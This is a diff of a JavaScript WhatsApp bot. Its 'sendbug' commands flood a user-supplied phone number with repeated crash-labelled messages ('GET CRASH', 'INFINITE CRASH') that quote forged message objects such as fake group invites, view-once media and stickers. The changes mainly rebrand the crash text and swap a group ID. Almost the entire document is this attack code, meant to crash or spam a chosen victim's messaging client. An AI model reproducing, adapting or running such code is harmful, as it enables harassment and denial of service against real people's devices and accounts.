+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
 await m.reply(`Succes`)
 break
 case 'sendbug7':
@@ -5672,7 +5512,7 @@ if (!text) throw `Nomernya?`
 let foncevid = { 
 key: {
 fromMe: false, 
-remoteJid: "6285775422460@g.us", 
+remoteJid: "6283149877456@g.us", 
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { 
@@ -5681,36 +5521,21 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid})
 await m.reply(`Succes`)
 break
 case 'sendbug8':
@@ -5727,36 +5552,21 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg})
 await m.reply(`Succes`)
 break
 case 'sendbug9':
@@ -5772,38 +5582,23 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
-"caption": `CXZA 935`,
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgc})
 await m.reply(`Succes`)
 break
 case 'sendbug10':
@@ -5832,36 +5627,21 @@ let stic = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:stic})
